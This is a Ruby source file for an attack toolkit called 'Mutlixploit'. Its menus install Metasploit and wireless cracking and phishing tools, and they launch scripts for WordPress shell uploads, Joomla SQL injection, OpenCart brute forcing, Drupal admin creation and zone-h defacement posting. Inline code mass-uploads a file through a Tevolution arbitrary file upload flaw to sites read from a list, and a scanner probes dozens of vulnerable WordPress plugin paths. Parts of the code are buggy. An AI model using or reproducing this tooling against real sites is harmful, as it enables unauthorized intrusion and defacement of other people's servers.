#!/usr/bin/env ruby
  
  #first scripte ruby language i hope u like it copyrights:Xhunter Mns
  #please do not change any of scriptes name 
system "reset"
require 'colorize'
puts""  
puts"[+] Welcome to Mutlixploit v 1.0 [+]".blue
puts""
puts"     ##coded by X-Hunter Mns## ".red
puts""

puts""
puts "1) install metasploit 32bit".yellow
puts""
puts "2) install metasploit 64bit".yellow
puts""
puts "3) wirless_attack tools".yellow
puts""
puts "4) webapplication attack tools".yellow
puts""
puts "5) scanning tools".yellow
puts""
puts "6) zone-h mass poster".yellow
puts ""
puts "7) payloads".yellow
puts ""
puts "8) Exit".red
puts ""
print"select your choice > "
choice = gets.chomp
print "" #{choice}
 
                       if choice == ""
                          then  system "ruby run.rb"
                       elsif choice == "1"
                          then system "wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-installer.run && wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-installer.run.sha1 && echo $(cat metasploit-latest-linux-installer.run.sha1)'  'metasploit-latest-linux-installer.run > metasploit-latest-linux-installer.run.sha1 && shasum -c metasploit-latest-linux-installer.run.sha1 && chmod +x ./metasploit-latest-linux-installer.run && sudo ./metasploit-latest-linux-installer.run"
                       elsif choice == "2"
                          then system  "wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-installer.run && wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-installer.run.sha1 && echo $(cat metasploit-latest-linux-installer.run.sha1)'  'metasploit-latest-linux-installer.run > metasploit-latest-linux-installer.run.sha1 && shasum -c metasploit-latest-linux-installer.run.sha1 && chmod +x ./metasploit-latest-linux-installer.run && sudo ./metasploit-latest-linux-installer.run" 
                       elsif choice == "3"
                          then
puts ""
 puts "3-0 aircrack".green
 puts ""
 puts "3-1) wifite v 1.0".green
 puts ""
 puts "3-2) fluxion".green
 puts ""
 puts "3-3) ghost phisher".green
 puts ""
 puts "3-4) pixiewps".green
 puts""
 puts"3-5) back <<".green
 puts""
 print"select your choice > "
  
 wireless = gets.chomp
     
                              if wireless == "3-0"
                                   then system "sudo apt install aircrack-ng"
                            elsif wireless == "3-1"
                                   then system "git clone https://github.com/derv82/wifite"   
                            elsif  wireless == "3-2" 
                                   then system "wget https://raw.githubusercontent.com/FluxionNetwork/fluxion/master/install/install.sh && bash install.sh"             
                            elsif wireless == "3-3"
                                   then system "https://github.com/savio-code/ghost-phisher"
                            elsif wireless == "3-4"
                                   then system "git clone https://github.com/wiire/pixiewps" 
                            elsif wireless == "3-5"
                                   then (system "reset") && (system "ruby run.rb")
                                 end
  elsif                      
 choice == "4" #webapps attack
 then
     puts ""
     puts "4-0)wordpress revslider mass shell upload".blue
     puts ""
     puts "4-1)joomla com_mezun sql injection".blue
     puts ""
     puts "4-2)opencart brute force (put your sites in opencart.txt)".blue
     puts ""
     puts "4-3)cms grabber from ip".blue
     puts ""
     puts "4-4)Gs bing dorker".blue
     puts ""
     puts "4-5)joomla foxcontact shell upload".blue
     puts ""
     puts "4-6)Drupal exploit add admin".blue
     puts""
     puts "4-7)wordpress mass exploiter Slider Templatic Tevolution Arbitrary File Upload".blue
     puts ""
     puts "4-8)back <<".blue
     puts ""
     print "select your choice > "
       
       webapplication = gets.chomp
         
                                if webapplication == "4-0"
                                    then
                                       system "perl wp.pl"
                                  elsif 
                                    webapplication == "4-1"
                                    then
                                   system "perl jom.pl"
                                 elsif 
                                   webapplication == "4-2"
                                   system "python opentcart.py opencart.txt"
                                   
                                  elsif 
                                    webapplication == "4-3"
                                    then system "perl ip.pl"                 #don't forget this scrite
                                  elsif
                                    webapplication == "4-4"
                                     then system "perl dr.pl"
                                   elsif webapplication =="4-5"
                                    then print"set target : "
                                          target = gets.chomp
                                         print "set CID : "
                                          CID = gets.chomp
                                         system "python3 fox.py --url #{target} --cid #{CID}"


                                  elsif
                                    webapplication == "4-6"
                                     then system "" 
                                  elsif webapplication == "4-7" 
                                  then
                                  puts"check if you put the websites in x.txt".yellow
                                 system 'reset'                                 
require 'net/http'
require 'colorize'
require 'date'
File.open("x.txt").each do |line| puts line

x = DateTime.now
x.strftime("%d/%m/%Y %H:%M")
puts "starting at", x 
puts""
url = gets.chomp
response = nil
puts"Checking #{url}".blue
Net::HTTP.start("#{url}", 80) {|http|
  response = http.head('/wp-content/plugins/Tevolution/tmplconnector/')
}
if response == "200"
  then puts "[Vuln]".green
else
  puts"[Not Vuln]".red
    puts"check path 127.0.0.1/wordpress/ or 127.0.0.1/wp/ ...".yellow
end
system "curl -k -X POST -F 'file=@./Hacked.txt' #{url}/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php"
Net::HTTP.start("#{url}", 80) {|http|
  response = http.head('wp-content/themes/Directory/images/tmp/Hacked.txt')
}
if response == "200"
  then puts "./Done #{url}/wp-content/themes/Directory/images/tmp/Hacked.txt".green
else puts "Failed to upload".red
end
end             # don't forget this scripte
                                  elsif
                                    webapplication == "4-8"
                                     then (system "reset") && (system "ruby run.rb")                              
                                   end
elsif
  choice == "5"
  puts""
  puts"5-1)jump to nmap"
  puts""
  puts"5-2)Scan server From ip"
  puts""
  puts"5-3)wp scan"
  puts""
  puts"5-4)joomscan"
  puts""
  puts"5-5)back <<"
  puts""
  print"select your choice > "
scan = gets.chomp

                                  if scan == "5-1"
                                    then system "nmap"
                                  elsif 
                                    scan == "5-2"
                                    print"drop your server ip"
                                    ip = gets.chomp
                                    #{ip}
                                    system "python Tn-Scan.py #{ip}"
                                  elsif 
                                    scan == "5-3"
                                    then 
system'reset'
puts"%%%%%%%%%%%  %%%      %%%    %%%%               %%%%  %%%%%%      %%%%%%%%%     %%%%%%%%%   %%%%%%%    %%%%      %%%"
puts"%          % %  %     % %    %   %      %%      %   % %      %   %         %   %        %  %        %  %   %     % %"
puts"%%%%   %%%%% %   %    % %     %   %    %  %    %   %  % %%%   %  %    %%%%  %  %  %%%%%%%  %  %%%   %  %    %    % %"
puts"   %   %     % %  %   % %      %   %  %    %  %   %   %      %    %   %   %%%  %  %        %  %%%   %  %     %   % %"
puts"   %   %     % % % %  % % %%%%% %   %%      %%   %    %   % %      %   %       %  %        %        %  %  %%  %  % %"
puts"   %   %     % %  % % % % %%%%%  %              %     %   %         %   %      %  %        %  %%%%  %  %  % %  % % %"
puts"   %   %     % %   % %% %         %            %      %   %     % %%%%   %     %  %%%%%%%  %  %  %  %  %  %  %  %% %"
puts"   %   %     % %    %   %          %    %%    %       %   %     %         %    %        %  %  %  %  %  %  %   %    %"
puts"   %%%%%     %%%     %%%            %%%%  %%%%        %%%%%      %%%%%%%%%%     %%%%%%%%%  %%%%  %%%%  %%%%    %%%%% v 1.0 "
puts""
puts""
puts "                                 [*] Fallaga Team Tunisian Cyber Resistance [*]     "
puts""
puts "                              "
puts""
puts""
puts ""
print "put your url here (without http://) > "
print""
url = gets.chomp 
require 'net/http'
require 'colorize'
puts"target : #{url}".green
response = nil
puts""
puts "[~] Scanning for wpcontactcreativeform vuln ...".blue
Net::HTTP.start("#{url}", 80) {|http|
  response = http.head('wp-content/plugins/sexy-contact-form/includes/fileupload/index.php')
}
if response == "200"
then puts "[*] vuln wpcontactcreativeform found ".green
else puts "[-] vuln wpcontactcreativeform not found".red
end
puts""
puts "[~] Scanning for wplazyseoplugin vuln ...".blue
Net::HTTP.start("#{url}", 80) {|http|
  response = http.head('wp-content/plugins/lazy-seo/lazyseo.php')
  }
if response == "200"
then puts "[*] vuln wplazyseoplugin found ".green
else puts "[-] vuln wplazyseoplugin not found".red
end
puts""
puts "[~] Scanning for vuln wp-job-manager ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/')
  }

    if response.code == "200"
       then puts "[*] vuln wp-job-manager found ".green 
    else puts "[-] vuln wp-job-manager not found".red 
    end
puts""
puts "[~] Scanning for vuln  wpeasyupload ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/plugins/easy-comment-uploads/upload-form.php') #fix this one
  }

    if response.code == "200"
       then puts "[*] vuln wpeasyupload found ".green 
    else puts "[-] vuln wpeasyupload not found ".red 
    end

puts""
    puts "[~] Scanning for vuln wpstorethemeremotefileupload ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/themes/WPStore/upload/index.php')
  }

    if response.code == "200"
       then puts "[*] vuln wpstorethemeremotefileupload found ".green 
    else puts "[-] vuln wpstorethemeremotefileupload not found".red 
    end
puts""
    puts "[~] Scanning for vuln  wp-symposium ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-symposium/server/file_upload_form.php')
  }

    if response.code == "200"
       then puts "[*] vuln wp-symposium found ".green 
    else puts "[-] vuln wp-symposium not found".red 
    end
    

puts""
    puts "[~] Scanning for vuln  Multiple Plugins ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('//wp-content/plugins/server/images.php')
  }

    if response.code == "200"
       then puts "[*] vuln Multiple Plugins found ".green 
    else puts "[-] vuln Multiple Plugins not found".red 
    end
    
  puts""
    puts "[~] Scanning for vuln  cysteme finder ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/plugins/cysteme-finder/php/connector.php')
  }

    if response.code == "200"
       then puts "[*] vuln cysteme finder found ".green 
    else puts "[-] vuln cysteme finder not found".red 
    end
  puts""
    puts "[~] Scanning for vuln  WP vault LFI ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('wp-content/plugins/wp-vault/')
  }

    if response.code == "200"
       then puts "[*] vuln WP vault LFI found ".green 
    else puts "[-] vuln WP vault LFI not found".red 
    end
puts""
    puts "[~] Scanning for vuln  slider Templatic Tevolution ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php') 
  }

    if response.code == "200"
       then puts "[*] slider Templatic Tevolution found ".green 
    else puts "[-] vuln slider Templatic Tevolution not found".red 
    end
puts""
    puts "[~] Scanning for vuln Wp Unauthenticated Content Injection ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/index.php/wp-json/wp/v2/posts/') 
  }

    if response.code == "200"
       then puts "[*] vuln Wp Unauthenticated Content Injection found ".green 
    else puts "[-] vuln Wp Unauthenticated Content Injection not found".red 
    end
puts""
    puts "[~] Scanning for vuln Memphis Document Library ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/plugins/memphis-documents-library/mdocs-downloads.php') 
  }

    if response.code == "200"
       then puts "[*] vuln Memphis Document Library found ".green 
    else puts "[-] vuln Wp Memphis Document Library not found".red 
    end
puts""
    puts "[~] Scanning for vuln IMDb Profile Widget LFI ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/plugins/imdb-widget') 
  }

    if response.code == "200"
       then puts "[*] vuln IMDb Profile Widget found ".green 
    else puts "[-] vuln Wp Memphis Document Library not found".red 
    end

puts""
    puts "[~] Scanning for vuln wp-photocart link ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/plugins/photocart-link/') 
  }

    if response.code == "200"
       then puts "[*] vuln wp-photocart link found ".green 
    else puts "[-] vuln  wp-photocart link not found".red 
    end

puts""
    puts "[~] Scanning for vuln Huge-IT Image Gallery ...".blue
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('wp-content/plugins/gallery-images/gallery-images.php') 
  }

    if response.code == "200"
       then puts "[*] vuln IHuge-IT Image Gallery found ".green 
    else puts "[-] vuln Huge-IT Image Gallery not found".red 
    end
puts""
puts "[~] Scanning for vuln RB Agency LFD ...".blue 
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/plugins/rb-agency/ext/forcedownload.php') 
  }

    if response.code == "200"
       then puts "[*] vuln RB Agency found ".green 
    else puts "[-] vuln RB Agency not found".red 
    end
puts""
puts "[~] Scanning for vuln Theme Uncode ...".blue 
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/uploads/uncode-fonts/') 
  }

    if response.code == "200"
       then puts "[*] vuln Theme Uncode found ".green 
    else puts "[-] vuln Theme Uncode not found".red 
    end  
puts""
puts "[~] Scanning for vuln Mac photo gallery ...".blue 
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('wp-content/plugins/mac-dock-gallery/upload-file.php')
  }

    if response.code == "200"
       then puts "[*] vuln Mac photo gallery found ".green 
    else puts "[-] vuln Mac photo Gallery not found".red 
    end  

puts""
puts "[~] Scanning for vuln Membership Simplified ...".blue 
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/plugins/membership-simplified-for-oap-members-only/download.php')
  }

    if response.code == "200"
       then puts "[*] vuln Membership Simplified found ".green 
    else puts "[-] vuln Membership Simplified not found".red 
    end  

  puts""
puts "[~] Scanning for vuln Slider Templatic Tevolution...".blue 
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/plugins/membership-simplified-for-oap-members-only/download.php')
  }

    if response.code == "200"
       then puts "[*] vuln Slider Templatic Tevolution found ".green 
    else puts "[-] vuln Slider Templatic Tevolution not found".red 
    end  

    puts""
puts "[~] Scanning for vuln Ultimate Product Catalog ...".blue 
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-content/plugins/ultimate-product-catalogue/')
  }

    if response.code == "200"
       then puts "[*] vuln Ultimate Product Catalog found ".green 
    else puts "[-] vuln Ultimate Product Catalog not found".red 
    end 

  puts""
puts "[~] Scanning for vuln WP Mobile Detector ...".blue 
Net::HTTP.start("#{url}", 80) {|http|
        response = http.head('/wp-includes/plugins/wp-mobile-detector')
  }

    if response.code == "200"
       then puts "[*] vuln WP Mobile Detector found ".green 
    else puts "[-] vuln WP Mobile Detector not found".red 
    end 

  
 puts"there is more wait For the Update".yellow
                                  elsif 
                                    scan == "5-4"
                                    then system "git clone github.com/rezasp/joomscan"
                                  elsif 
                                    scan == "5-5"
                                      then (system "reset") && (system "ruby run.rb")
                                  end
   elsif choice == "6"
    then
    puts""
    puts"6-1)zone-h poster(put your websites in zone.txt)"
    puts""
    puts"6-2)back <<"
    puts""
    print "select your choice > "

    zone = gets.chomp

                    if zone == "6-1"
                      then system "perl zone.pl"
                    elsif 
                       zone == "6-2"
                      then (system "reset") && (system "ruby run.rb")
                    end
  elsif choice == "7"
  puts "[*]under constructions"
  puts "0)back <<"
  print "select your choice > "
 payload = gets.chomp 
 if payload == "0"
  then system "ruby run.rb"
end

elsif choice == "8"
 then print "are you sure you want to exit? [ yes / no ] : "
exit = gets.chomp
if exit == "yes"
   then 
   puts""
   puts "Good bye !"
   puts ""
 else
   (system "reset") && (system "ruby run.rb")
end


  


                                    
                                    

                                                                                                                                    end

      
    
